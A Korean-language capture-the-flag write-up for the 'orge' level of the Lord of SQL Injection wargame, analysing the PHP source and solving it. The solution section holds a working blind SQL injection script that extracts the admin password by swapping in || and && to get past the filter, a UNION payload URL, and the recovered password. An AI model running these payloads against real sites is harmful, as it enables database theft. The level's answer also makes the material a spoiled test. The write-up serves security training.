# Lord of SQL Injection No.7 - orge

## 문제 출제 의도

OR, AND를 사용하지 않고 Blind SQL Injection을 수행하여 원하는 문자열을 얻어낼 수 있는지 확인한다.

또는 UNION 구문과 LIMIT을 이용하여 원하는 문자열을 얻어낼 수 있는지 확인한다.

## 소스 코드 분석

orge 문제의 php 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
```
* GET방식으로 pw를 받고, pw에 `prob`, `_`, `.`, `(`, `)` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, pw에 대소문자 구분 없이 `or`, `and` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
```
* 받은 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* `$result['id']`에 "0"을 제외한 어떤 값이든 들어 있으면 응답에 "Hello "와 $result[id] 값을 붙인 문자열이 포함된다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같음'이다. 즉, 실제 데이터베이스에 저장된 pw를 알아내서 전달해야 한다.

-----

## Solution
    
1. SUBSTR() 함수 활용

    Blind SQL Injection 문제이므로 4번 orc 문제에서 이용한 코드를 수정하여 활용한다.
    
    ```python
    import urllib.request
    from urllib.parse import quote

    key = ""

    # 4번 orc 문제에서 이용한 코드에서 추가된 부분
    pwlen = 0 # pw의 길이값을 저장한 변수

    for i in range(1, 20): # pw의 길이를 알아내기 위한 반복문. 길이가 1보다 크거나 같고 20보다 작다는 전제 하에 작동한다. 만약 길이를 알아내는 데 실패하면 범위를 넓힌다.
        url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
        data = "' || id='admin' && length(pw)='{}'#".format(str(i)) # length() 함수를 통해 pw의 길이를 알아내는 부분이다.
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            pwlen = i # pw의 길이를 pwlen 변수에 저장한다.
            print('pw length : ' + str(pwlen))
            break
    # /4번 orc 문제에서 이용한 코드에서 추가된 부분

    for i in range(1, pwlen + 1): # i에는 1부터 pwlen까지 들어가도록 반복문을 구성
        for j in range(32, 127):
            url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
            data = "' || id='admin' && substr(pw, 1, {})='{}'#".format( # or, and 를 ||, && 로 수정
                str(i), key + chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)

            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
            re.add_header(
                "Cookie", "PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"
            )

            req = urllib.request.urlopen(re)

            if str(req.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ```

    이러한 코드를 실행하면 결과값으로 6c864dec 를 출력한다.
    이를 GET방식으로 pw의 값으로 전달하면 풀린다.
    
    ```
    http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=6c864dec
    ```

2. UNION 구문 및 LIMIT 구문 이용 (2017년 9월 7일 목요일 기준 실행 불가능)

    7번 문제는 UNION 구문을 필터링 하지 않고 있으므로 UNION을 통해 바로 pw값을 알아내는 시도를 해볼 수 있다.

    ```
    http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=-1' || @a:=pw %26%26 0 union select @a-- -
    ```

    ```
    select id from prob_orge where id='guest' and pw='' || @a:=pw && 0 union select @a-- -'
    ```

    ```
    Hello 6c864dec
    ```

    2017년 9월 7일 목요일 현재 SELECT 구문 입력이 차단된 것으로 보인다. SELECT 구문이 포함된 SQL Injection 시도 시 무한 로딩에 걸린다.